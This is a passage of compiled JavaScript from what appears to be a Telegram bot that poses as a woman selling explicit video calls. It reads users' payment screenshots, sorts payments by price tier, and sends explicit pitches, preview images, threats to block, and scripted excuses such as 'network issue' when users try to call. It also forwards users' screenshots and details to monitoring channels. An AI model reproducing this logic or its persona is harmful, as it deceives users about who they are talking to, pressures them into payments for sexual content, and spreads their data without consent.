                                    const shouldHandleEvent = !userDetails || (userDetails && !broadcastName.toLowerCase().endsWith('bot') && Date.now() > userDetails.limitTime && userDetails.canReply !== 0);
                                    if (shouldHandleEvent) {
                                        if ((userDetails === null || userDetails === void 0 ? void 0 : userDetails.payAmount) < 10 && userDetails.paidCount < 3) {
                                            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                                try {
                                                    yield event.client.markAsRead(event.message.chatId, event.message);
                                                }
                                                catch (error) {
                                                    console.log('Cannot mark as read');
                                                }
                                            }), 5000);
                                            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                                yield (0, utils_1.setTyping)(userDetails.chatId);
                                            }), 7000);
                                        }
                                        else {
                                            if (userDetails.payAmount > 25 && userDetails.paidReply && userDetails.totalCount > 3 && (userDetails.totalCount % 7) == 0) {
                                                yield (0, utils_1.asktoPayByEvent)(event.client, userDetails);
                                            }
                                        }
                                        if (event.message.text && event.message.text !== '') {
                                            yield createOrUpdateEventsMap(event);
                                        }
                                    }
                                    else {
                                        if ((0, utils_1.isServicePending)(userDetails)) {
                                            if (userDetails.highestPayAmount < 250 || (userDetails.highestPayAmount >= 250 && userDetails.callTime <= Date.now() - 2 * 60 * 60 * 1000)) {
                                                try {
                                                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.uptimebot}/requestCall?clientId=${(_d = process.env.clientId) === null || _d === void 0 ? void 0 : _d.toLowerCase()}&chatId=${chatId}&type=1`);
                                                }
                                                catch (error) {
                                                    console.log('Cannot request Another call', error);
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            yield db.createOrUpdateStats(chatId, senderJson.firstName, (userDetails === null || userDetails === void 0 ? void 0 : userDetails.payAmount) ? userDetails.payAmount : 0, false, userDetails.demoGiven, userDetails.paidReply, userDetails.secondShow);
                        }
                    }
                    else {
                        console.log("Seems New USer - ", broadcastName);
                        yield db.createOrUpdateStats(chatId, senderJson.firstName, 0, true, false, true, false);
                        yield (0, inhandlerUpdated_1.eventPrint)(event, event.message.text.toLowerCase());
                    }
                }
            }
        }
        catch (error) {
            (0, parseError_1.parseError)(error, "Event Error");
        }
    });
}
;
function requestCall(chatId_1) {
    return __awaiter(this, arguments, void 0, function* (chatId, force = false) {
        const client = tgClass.getClient();
        const userDetail = yield db.read(chatId);
        plsMap.set(chatId, 0);
        try {
            console.log("In Request Call", chatId, userDetail.payAmount, userDetail.demoGiven);
            if (((0, utils_1.isServicePending)(userDetail) && userDetail.callTime < Date.now() - 4 * 60000) || force) {
                try {
                    if (phoneCall === undefined) {
                        (0, phonestate_1.createPhoneCallState)();
                        const dhConfig = yield client.invoke(new telegram_1.Api.messages.GetDhConfig({}));
                        const gAHash = yield (0, phonestate_1.requestPhoneCall)(dhConfig);
                        try {
                            const result = yield client.invoke(new telegram_1.Api.phone.RequestCall({
                                video: true,
                                userId: chatId,
                                randomId: generateRandomInt(),
                                gAHash: Buffer.from(gAHash),
                                protocol: new telegram_1.Api.PhoneCallProtocol({
                                    udpP2p: true,
                                    udpReflector: true,
                                    minLayer: 65,
                                    maxLayer: 105,
                                    libraryVersions: ['2.4.4', '4.0.0']
                                }),
                            }));
                            phoneCall = result.phoneCall;
                            setTimeout(() => {
                                if (phoneCall && (phoneCall.id === result.phoneCall.id)) {
                                    phoneCall = undefined;
                                    (0, phonestate_1.destroyPhoneCallState)();
                                }
                            }, 120000);
                        }
                        catch (error) {
                            phoneCall = undefined;
                            (0, phonestate_1.destroyPhoneCallState)();
                            (0, parseError_1.parseError)(error, undefined, false);
                            try {
                                if (error.errorMessage === 'USER_PRIVACY_RESTRICTED') {
                                    yield client.sendMessage(chatId, { message: "Change Your Call Settings\n\nPrivacy Settings... I'm unable to call..!!" });
                                }
                                else {
                                    yield client.sendMessage(chatId, { message: "some Issue at yourside, I'm unable to call..!!" });
                                }
                            }
                            catch (error) {
                                (0, parseError_1.parseError)(error);
                            }
                        }
                    }
                    else {
                        phoneCallQueue.push(chatId);
                        console.log("Pushing to Queue inside!!", phoneCallQueue.length);
                    }
                }
                catch (error) {
                    (0, parseError_1.parseError)(error);
                    phoneCall = undefined;
                    (0, phonestate_1.destroyPhoneCallState)();
                    try {
                        yield client.sendMessage(chatId, { message: "some Issue at yourside, I'm unable to call..!!" });
                    }
                    catch (error) {
                        (0, parseError_1.parseError)(error);
                    }
                }
                return true;
            }
            else {
                if (userDetail.canReply !== 0) {
                    yield sendMessageWithButton(`Failed to Call`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`https://arpithared.onrender.com/events/delete?chatId=${chatId}`);
                    yield db.update(chatId, { paidReply: true, limitTime: Date.now() });
                }
                return false;
            }
        }
        catch (error) {
            if (userDetail.canReply !== 0) {
                yield sendMessageWithButton(`Failed to Call`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                (0, parseError_1.parseError)(error, "Error At Calling");
            }
            return false;
        }
    });
}
function getUserStats(isTemp) {
    return __awaiter(this, void 0, void 0, function* () {
        let entries;
        if (isTemp) {
            entries = yield db.readstats();
        }
        else {
            entries = yield db.readstats2();
        }
        const total = entries.length;
        let totalPaid = 0;
        let totalNew = 0;
        let totalCount = 0;
        let totalNewPaid = 0;
        let newPaidDemo = 0;
        let totalOldPaid = 0;
        let oldPaidDemo = 0;
        let newPendingDemos = 0;
        let oldPendingDemos = 0;
        let totalpendingDemos = 0;
        let reply = `@${(process.env.clientId).toUpperCase()}`;
        for (const entry of entries) {
            const { count, newUser, payAmount, demoGivenToday, demoGiven } = entry;
            totalCount += count;
            totalPaid += payAmount > 0 ? 1 : 0;
            totalOldPaid += (payAmount > 0 && !newUser) ? 1 : 0;
            oldPaidDemo += (demoGivenToday && !newUser) ? 1 : 0;
            totalpendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;
            oldPendingDemos += (payAmount > 25 && !demoGiven && !newUser) ? 1 : 0;
            if (newUser) {
                totalNew += 1;
                totalNewPaid += payAmount > 0 ? 1 : 0;
                newPaidDemo += demoGivenToday ? 1 : 0;
                newPendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;
            }
            // if (entry.payAmount > 15) {
            //     reply += `${name}: ${count} | ${newUser} | ${payAmount}\n`;
            // }
        }
        reply += `\n    TotalUsers: ${total}
    TotalMsgCount: ${totalCount}
    TotalNewUsers: ${totalNew}

    Paid Users:
    TotalOldPAIDUsers: ${totalOldPaid}
    TotalNewPAIDUsers: ${totalNewPaid}
    TotalPaidUsers: ${totalPaid}`;
        yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(reply)}`);
    });
}
function getDemoStats(isTemp) {
    return __awaiter(this, void 0, void 0, function* () {
        let entries;
        if (isTemp) {
            entries = yield db.readstats();
        }
        else {
            entries = yield db.readstats2();
        }
        let totalPaid = 0;
        let totalNew = 0;
        let totalCount = 0;
        let totalNewPaid = 0;
        let newPaidDemo = 0;
        let totalOldPaid = 0;
        let oldPaidDemo = 0;
        let newPendingDemos = 0;
        let oldPendingDemos = 0;
        let totalpendingDemos = 0;
        let reply = `@${(process.env.username).toUpperCase()}`;
        for (const entry of entries) {
            const { count, newUser, payAmount, demoGivenToday, demoGiven } = entry;
            totalCount += count;
            totalPaid += payAmount > 0 ? 1 : 0;
            totalOldPaid += (payAmount > 0 && !newUser) ? 1 : 0;
            oldPaidDemo += (demoGivenToday && !newUser) ? 1 : 0;
            totalpendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;
            oldPendingDemos += (payAmount > 25 && !demoGiven && !newUser) ? 1 : 0;
            if (newUser) {
                totalNew += 1;
                totalNewPaid += payAmount > 0 ? 1 : 0;
                newPaidDemo += demoGivenToday ? 1 : 0;
                newPendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;
            }
        }
        reply += `\n    Demos Given Today:
    OldPaidDemos: ${oldPaidDemo}
    NewPaidDemos: ${newPaidDemo}
    TotalPaidDemos: ${newPaidDemo + oldPaidDemo}

    Pending Demos:
    OldPendingDemos : ${oldPendingDemos}
    NewPendingDemos: ${newPendingDemos}
    TotalPendingDemos: ${totalpendingDemos}`;
        yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(reply)}`);
    });
}
const createNewChatEntry = (chatId, event) => __awaiter(void 0, void 0, void 0, function* () {
    eventsMap.set(chatId, {
        events: [event],
        timeout: setTimeout(() => __awaiter(void 0, void 0, void 0, function* () {
            const events = eventsMap.get(chatId).events;
            eventsMap.delete(chatId);
            yield (0, inhandlerUpdated_1.eventPrint)(events[events.length - 1], event.message.text.toLowerCase());
        }), 8000)
    });
});
const updateExistingChatEntry = (chatId, event) => __awaiter(void 0, void 0, void 0, function* () {
    clearTimeout(eventsMap.get(chatId).timeout);
    eventsMap.get(chatId).events.push(event);
    eventsMap.get(chatId).timeout = setTimeout(() => __awaiter(void 0, void 0, void 0, function* () {
        const events = eventsMap.get(chatId).events;
        eventsMap.delete(chatId);
        const concatedMsg = concatenateMessages(events);
        yield (0, inhandlerUpdated_1.eventPrint)(events[events.length - 1], concatedMsg);
    }), 5000);
});
const concatenateMessages = (events) => {
    return events.map(ev => ev.message.text.toLowerCase()).join(' ');
};
function generateRandomInt() {
    return (0, Helpers_1.readBigIntFromBuffer)((0, Helpers_1.generateRandomBytes)(4), true, true).toJSNumber();
}
function checkAndReturn(amount, payAmount) {
    const strAmount = amount.toString();
    console.log("Comparing: ", amount, payAmount);
    if (amount !== payAmount) {
        if (strAmount.endsWith('25')) {
            if (payAmount < 25) {
                return 25;
            }
            else {
                return 125;
            }
        }
        else if (strAmount.endsWith('50')) {
            if (amount > payAmount) {
                if (payAmount < 30 && strAmount.length <= 3) {
                    return 50;
                }
                else if (payAmount < 150 && amount >= 100 && strAmount.length > 3) {
                    return 150;
                }
                else if (payAmount < 350 && amount >= 180 && strAmount.length > 3) {
                    return 350;
                }
                else {
                    return amount;
                }
            }
            else {
                return amount;
            }
        }
        else {
            return amount;
        }
    }
    else {
        return amount;
    }
}
function downloadMediaWithRetry(event) {
    return __awaiter(this, void 0, void 0, function* () {
        let retries = 3;
        while (retries > 0) {
            try {
                const photoBuffer = yield event.client.downloadMedia(event.message);
                if (Buffer.isBuffer(photoBuffer)) {
                    return photoBuffer;
                }
                else {
                    console.error('Invalid photo buffer:', photoBuffer);
                }
            }
            catch (error) {
                console.error('Error downloading media:', error);
            }
            retries--;
        }
        throw new Error('Failed to download valid photo buffer after retries.');
    });
}
function processImage(event) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a, _b, _c, _d, _e, _f, _g;
        try {
            const chatId = event.message.chatId.toString();
            console.log("Proceesing Pic: ", chatId, "totlApiCount: ", totalPic);
            const photoBuffer = yield downloadMediaWithRetry(event);
            const imageDetails = yield (0, imageDetails_1.getImageDetails)(photoBuffer);
            imageDetails.amount = imageDetails.amount || 0;
            const sanitizedData = (0, parseImage_1.parseImage)(imageDetails);
            console.log(sanitizedData);
            let userDetails = yield db.read(chatId);
            const processedAmount = checkAndReturn(imageDetails.amount, userDetails.payAmount);
            let amount = processedAmount;
            const text = imageDetails.text.toLowerCase().replace(/(\r\n|\n|\r)/g, ' ');
            imageDetails.text = text;
            const senderJson = yield (0, utils_1.getSenderJson)(event);
            const broadcastName = senderJson.username ? `@${senderJson.username}` : senderJson.firstName + ' ' + senderJson.lastName ? senderJson.lastName : '';
            const invalidPhotoInfo = invalidPhotosMap.get(chatId) || { count: 1, time: 0 };
            const invalidPhotoCount = invalidPhotoInfo.count || 0;
            if (invalidPhotoCount > 4) {
                if (invalidPhotoCount > 6) {
                    try {
                        yield event.message.forwardTo(yield TelegramBots_config_1.BotConfig.getInstance().getChannelId(TelegramBots_config_1.ChannelCategory.CLIENT_UPDATES));
                        yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${(process.env.clientId).toUpperCase()}: ${chatId}\nName:${broadcastName}\nAmount:${userDetails.payAmount}\nDemoGiven:${userDetails.demoGiven}\nDescription : ${imageDetails.description}\n\nBanned User for invalid Pictures- ${invalidPhotoCount}`)}`);
                    }
                    catch (error) {
                        try {
                            const channel = yield TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.CLIENT_UPDATES);
                            yield event.message.forwardTo(channel);
                            yield event.client.sendMessage(channel, { message: encodeURIComponent(`@${(process.env.clientId).toUpperCase()}: ${chatId}\nName:${broadcastName}\nAmount:${userDetails.payAmount}\nDemoGiven:${userDetails.demoGiven}\nDescription : ${imageDetails.description}\n\nBanned User for invalid Pictures- ${invalidPhotoCount}`) });
                            yield TelegramBots_config_1.BotConfig.getInstance().sendMessage(TelegramBots_config_1.ChannelCategory.CLIENT_UPDATES, `start ${process.env.clientId}`);
                        }
                        catch (error) {
                            console.log('Error forwarding message:', error);
                        }
                    }
                    yield db.updateSingleKey(chatId, dbservice_1.user.canReply, 0);
                }
                else {
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Dont send Other Pics/Screenshots, I am Warning you!!!\n\n<b>I will BLOCK You</b>, If u send random pics again!\n\n\n<b>Pay Me!!\nI will Show you Boobs in video Call Now Itself!!\nQR:</b> ${messages_1.payLinks.phonepe1}`, parseMode: 'html' }));
                }
            }
            let msg = `@${process.env.clientId.toUpperCase()}\nChatId : ${chatId}\nUser : ${broadcastName}\nProcessAm : ${processedAmount}\nInvalidCount : ${invalidPhotoCount}\nDemoGiven : ${userDetails.demoGiven}\nPrevAm: ${userDetails.payAmount}\n\nText : ${(_a = imageDetails.text) === null || _a === void 0 ? void 0 : _a.replace(/[\r\n]+/g, ' ')}`;
            yield (0, utils_1.setTyping)(chatId);
            if (imageDetails && (sanitizedData.isPaymentRelated || sanitizedData.isPaymentMine)) {
                try {
                    yield event.message.forwardTo(yield TelegramBots_config_1.BotConfig.getInstance().getChannelId(TelegramBots_config_1.ChannelCategory.CLIENT_UPDATES));
                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(msg)}`);
                }
                catch (error) {
                    try {
                        const channel = yield TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.CLIENT_UPDATES);
                        yield event.message.forwardTo(channel);
                        yield event.client.sendMessage(channel, { message: encodeURIComponent(msg) });
                        yield TelegramBots_config_1.BotConfig.getInstance().sendMessage(TelegramBots_config_1.ChannelCategory.CLIENT_UPDATES, `start ${process.env.clientId}`);
                    }
                    catch (error) {
                        console.log('Error forwarding message:', error);
                    }
                }
            }
            else {
                yield forwardToChannel(event, '@unwantedupdates1');
                msg = `UNWANTED IMAGE : @${process.env.clientId.toUpperCase()}\nChatId : ${chatId}\nUser : ${broadcastName}\nInvalidCount: ${invalidPhotoCount}\n\n\n${(0, utils_1.parseObjectToString)(Object.assign(Object.assign({}, imageDetails), { text: (_b = imageDetails.text) === null || _b === void 0 ? void 0 : _b.replace(/[\r\n]+/g, ' ') }))}\n\n\n${(0, utils_1.parseObjectToString)(sanitizedData)}`;
                try {
                    yield event.client.sendMessage('@unwantedupdates1', { message: msg });
                }
                catch (error) {
                }
            }
            if (imageDetails && sanitizedData.isPaymentRelated) {
                if ((text === null || text === void 0 ? void 0 : text.startsWith("payment to")) && (0, inhandlerUpdated_1.contains)(text, ['phonepe', 'transfer details'])) {
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: "It's a Failed payment, Dont play Games!!" }));
                    yield sendMessageWithButton(`Trying to Scam!!`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                }
                else if ((0, inhandlerUpdated_1.contains)(text.toLowerCase(), [`${process.env.name} connecting`, 'failed to connect'])) {
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: (0, utils_1.selectRandomElements)(['wait...', "Wait trying again", "network issue", 'net problem'], 1)[0] }));
                }
                else {
                    const isLocalFailedImg = (0, parseImage_1.isLocalFailed)(imageDetails);
                    console.log("isLocalFailedImg: ", isLocalFailedImg);
                    if ((sanitizedData.isFinishedPayment || (!sanitizedData.isFinishedPayment && isLocalFailedImg)) && isNotQuestionable((_d = (_c = event.message) === null || _c === void 0 ? void 0 : _c.text) === null || _d === void 0 ? void 0 : _d.toLowerCase())) {
                        if (sanitizedData.isFailedPayment || (isLocalFailedImg && !sanitizedData.isFinishedPayment)) {
                            yield (0, utils_1.deleteMessage)(event);
                            yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `**Oye....!! Payment Failed??**` }));
                            yield sendMessageWithButton(`Failed Payment, Number SENT`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                            yield respToFailedMSg(event, imageDetails.text, chatId);
                            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Dont Send me Failed screenshot, Send Only success one!!\n\nTry to **SCAN** QR using **Another Mobile**!!\nThen only it will work!!` }));
                            }), 10000);
                            yield (0, utils_1.sendImageToChannel)(photoBuffer, process.env.FailedPaymentsChannel);
                        }
                        else {
                            if ((0, inhandlerUpdated_1.contains)(text, common_1.fakeScreenshotText)) {
                                yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: "Hatt...\nFake screenshot!!\n\nI'm Blocking you!!" }));
                                yield sendMessageWithButton(`Told Fake Screenshot!!`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                    yield db.updateSingleKey(chatId, dbservice_1.user.limitTime, Date.now() + (10 * 60 * 1000));
                                    yield db.updateSingleKey(chatId, dbservice_1.user.canReply, 0);
                                }), 20000);
                            }
                            else if (sanitizedData.isPaymentMine && imageDetails.isSuccess) {
                                if (!(amount > 0 && amount < 1000)) {
                                    yield sendMessageWithButton(`AmountNotInRange:MESSAGE_DELETED\nTold seems like fake`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `This looks like Fake payment, Send me detailed payment screenshot from **Transactions History**\nDont send same pic again` }));
                                    }), 10000);
                                }
                                else {
                                    if (amount > 11) {
                                        let didPayOthers = false;
                                        const didPayOthersResp = yield db.checkIfPaidToOthers(chatId);
                                        const { payAmount } = userDetails;
                                        if ((didPayOthersResp.paid !== '' || didPayOthersResp.demoGiven !== '') && (!text.includes(process.env.name.split(" ")[0].toLowerCase()) && !text.includes(process.env.product))) {
                                            // await picEvent.message.respond({ message: `Wait...\nI'm verifying your Payment again!!\nI think U paid to ${didPayOthersResp.paid} ${didPayOthersResp.demoGiven !== "" ? (`and U also took Demo from ${didPayOthersResp.demoGiven}`) : ""}` });
                                            const reply = `@${(process.env.clientId).toUpperCase()}: ` + broadcastName + ": Trying to scam!!\n\n" + `Paid: ${didPayOthersResp.paid}\n` + `Demo: ${didPayOthersResp.demoGiven}`;
                                            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(reply)}`);
                                            didPayOthers = true;
                                        }
                                        const isWithinPastTenMinutesImage = (0, isWithinPastTenMinutes_1.default)(imageDetails.time);
                                        const isPaymentProperlyMine = yield handleMyPayment(imageDetails, userDetails, isWithinPastTenMinutesImage, didPayOthers);
                                        if (isPaymentProperlyMine.isvalid) {
                                            invalidPhotosMap.delete(chatId);
                                            if (amount > userDetails.highestPayAmount) {
                                                userDetails = yield db.updateSingleKey(chatId, dbservice_1.user.highestPayAmount, amount);
                                                userDetails.highestPayAmount = amount;
                                            }
                                            if ((amount !== payAmount) && (amount < 30 || amount == 125)) {
                                                if (payAmount > 25) {
                                                    amount = amount > userDetails.payAmount ? amount : userDetails.payAmount;
                                                }
                                                else {
                                                    amount = 25;
                                                }
                                                if (userDetails.picsSent > 0) {
                                                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: "I have sent you Pics for your money\nCall is just **50Rs**\n\nPay and msg!!\nDont Waste yor Time" }));
                                                    yield sendMessageWithButton(`Told Pics Already Sent\n${isWithinPastTenMinutesImage.time}`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                                                }
                                                else {
                                                    yield sendMessageWithButton(`PICS SENT\n${isWithinPastTenMinutesImage.time}`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                                                    try {
                                                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: "Wait....\nSending pics!!" }));
                                                        setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                                            yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, {
                                                                file: [
                                                                    (0, common_1.getClientFilePath)("dmp1.jpg"),
                                                                    (0, common_1.getClientFilePath)("dmp2.jpg"),
                                                                    (0, common_1.getClientFilePath)("dmp3.jpg"),
                                                                    (0, common_1.getClientFilePath)("dmp4.jpg")
                                                                ],
                                                                message: "Take Demo Video Call, I Will show you Directly!!\nI'm not wearing clothes now!!♥️🙈\n\n**Just 50₹!!**"
                                                            }));
                                                            yield db.updateSingleKey(chatId, dbservice_1.user.picsSent, userDetails.picsSent ? userDetails.picsSent : 0 + 1);
                                                        }), 6000);
                                                    }
                                                    catch (error) {
                                                        (0, parseError_1.parseError)(error);
                                                    }
                                                }
                                                const updatedUserDetails = { payAmount: amount };
                                                userDetails = yield db.update(chatId, updatedUserDetails);
                                            }
                                            else if (amount >= 15 && amount < 1000) {
                                                if (amount >= 30 && amount >= (userDetails.payAmount + 25) && (0, utils_1.canStartService)(userDetails, amount)) {
                                                    yield initiateCall(amount, userDetails, "Reg");
                                                    (0, utils_1.deleteMessagesBeforeId)(userDetails.chatId, event.message.id);
                                                }
                                                else {
                                                    if ((0, utils_1.canStartService)(userDetails, amount)) {
                                                        yield db.update(chatId, { highestPayAmount: userDetails.highestPayAmount, payAmount: Math.max(userDetails.payAmount, amount) });
                                                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Hey U can Call me here\n\nhttps://zomCall.netlify.app/${process.env.clientId}/${userDetails.chatId.toString()}\n\nCall me now!!` }));
                                                        yield db.updateSingleKey(chatId, dbservice_1.user.limitTime, Date.now() + (2 * 60 * 60 * 1000));
                                                        yield sendMessageWithButton(`Told to Call`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                                                    }
                                                    else {
                                                        if (amount < 30 && (amount <= 25 || (amount > 25 && !userDetails.picsSent))) {
                                                            if (userDetails.picsSent > 0) {
                                                                yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: "I have sent you Pics for your money\nCall is just **50Rs**\n\nPay and msg!!\nDont Waste yor Time" }));
                                                                yield sendMessageWithButton(`Told Pics Already Sent\n${isWithinPastTenMinutesImage.time}`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                                                            }
                                                            else {
                                                                try {
                                                                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: "Wait....\nSending pics!!" }));
                                                                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                                                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, {
                                                                            file: [
                                                                                (0, common_1.getClientFilePath)("dmp1.jpg"),
                                                                                (0, common_1.getClientFilePath)("dmp2.jpg"),
                                                                                (0, common_1.getClientFilePath)("dmp3.jpg"),
                                                                                (0, common_1.getClientFilePath)("dmp4.jpg")
                                                                            ],
                                                                            message: "Take Demo Video Call, I Will show you Directly!!\nI'm not wearing clothes now!!♥️🙈\n\n**Just 50₹!!**"
                                                                        }));
                                                                        yield db.updateSingleKey(chatId, dbservice_1.user.picsSent, userDetails.picsSent ? userDetails.picsSent : 0 + 1);
                                                                    }), 6000);
                                                                }
                                                                catch (error) {
                                                                    (0, parseError_1.parseError)(error);
                                                                }
                                                            }
                                                        }
                                                        else if ((userDetails.payAmount < 60 && userDetails.demoGiven) || (userDetails.payAmount < 160 && userDetails.secondShow) || amount <= userDetails.payAmount) {
                                                            if (isWithinPastTenMinutesImage.result && imageDetails.amount > 40 && userDetails.callTime < Date.now() - 15 * 60 * 1000) {
                                                                if (userDetails.secondShow) {
                                                                    userDetails.secondShow = false;
                                                                    yield initiateCall(userDetails.payAmount, userDetails, 'Re-initiated Call');
                                                                }
                                                                else {
                                                                    const updatedAmount = (0, utils_1.isServicePending)(userDetails) ? userDetails.payAmount : userDetails.payAmount + 100;
                                                                    yield initiateCall(updatedAmount, userDetails, 'Re-initiated Call');
                                                                }
                                                                (0, utils_1.deleteMessagesBeforeId)(userDetails.chatId, event.message.id);
                                                                // await sendMessageWithButton(`, ${imageDetails.time}\n${isWithinPastTenMinutesImage.time}`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`)
                                                            }
                                                            else {
                                                                yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: "**Your Call is Over Baby!!**\nPay again if u want more**\n\nNo MONEY? then No SERVICE!!\nDont WASTE your TIME Dear!!**" }));
                                                                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                                                    let msg = '';
                                                                    if (userDetails.payAmount < 30) {
                                                                        msg = messages_1.messages.demo;
                                                                    }
                                                                    else if (userDetails.payAmount < 100) {
                                                                        msg = "**Take Full Show Baby....!!**\nPussy also!!\n\nWithout Face : **100₹**\nWith Face      : **150₹**\n\nI'm alone in my room now!!\nLets Enjoy dear...\nPay and Msg!!";
                                                                    }
                                                                    else {
                                                                        msg = "**30 Mins VideoCall   :  350₹/-\n1 Hour Full show with Face!!   :   600₹/-**\n\nI'm alone in my room now!!\nLets Enjoy dear...\nPay and Msg!!";
                                                                    }
                                                                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: msg }));
                                                                    yield (0, Helpers_1.sleep)(15000);
                                                                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: "**Send me New Payment Screenshot Only**" }));
                                                                }), 15000);
                                                                yield sendMessageWithButton(`Told His Call is Over!! ${imageDetails.time}\n${isWithinPastTenMinutesImage.time}`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                                                            }
                                                            const invalidPhotoCount = (_e = (invalidPhotosMap.get(chatId))) === null || _e === void 0 ? void 0 : _e.count;
                                                            invalidPhotosMap.set(chatId, { count: invalidPhotoCount ? invalidPhotoCount - 1 : 0, time: Date.now() });
                                                        }
                                                        else {
                                                            yield sendMessageWithButton(`Ignored PIC - Weird Case`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                                                        }
                                                    }
                                                    if ((0, inhandlerUpdated_1.contains)(text, ['fmp'])) {
                                                        setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                                            yield (0, utils_1.deleteMessage)(event);
                                                        }), 15000);
                                                    }
                                                    if (amount <= userDetails.payAmount && !isWithinPastTenMinutesImage.result) {
                                                        yield (0, utils_1.deleteMessage)(event);
                                                        yield sendMessageWithButton(`UnWanted Pic Deleted(same/less Amount)\nPrev:${userDetails.payAmount}\nNow:${amount}`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                                                    }
                                                }
                                            }
                                            else {
                                                yield (0, utils_1.deleteMessage)(event);
                                                yield sendMessageWithButton(`WeirdCase Pic Deleted\nPrev:${userDetails.payAmount}\nNow:${amount}`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                                            }
                                        }
                                        else {
                                            yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: isPaymentProperlyMine.msg }));
                                            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                                yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `${messages_1.messages.qr}\n\n${messages_1.messages.link}`, file: (0, common_1.getClientFilePath)('./QR.jpg') }));
                                            }), 20000);
                                            yield sendMessageWithButton(`Told: \n${isPaymentProperlyMine.msg}`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                                        }
                                    }
                                    else {
                                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Hey... Not **${amount}₹**!!\n\n` + messages_1.messages.demo }));
                                        yield sendMessageWithButton(`Told Not Just - ${amount}₹`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                                    }
                                }
                            }
                            else {
                                yield (0, utils_1.deleteMessage)(event);
                                yield sendMessageWithButton(`PaymentNotMine:MESSAGE_DELETED\nAsked to Pay me!`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                    const msg = (0, messages_1.pickOneMsg)(["what??", "??", "Did you send something??", "Heyy??", "hlo??", "Oyeee..??"]) + '\n\n\n**Its not Mine!!**';
                                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `${msg}\n\nFinish **My Payment** and Send Screenshot!!` }));
                                }), 10000);
                                const invalidPhotoCount = ((_f = (invalidPhotosMap.get(chatId))) === null || _f === void 0 ? void 0 : _f.count) || 0;
                                invalidPhotosMap.set(chatId, { count: invalidPhotoCount + 1, time: Date.now() });
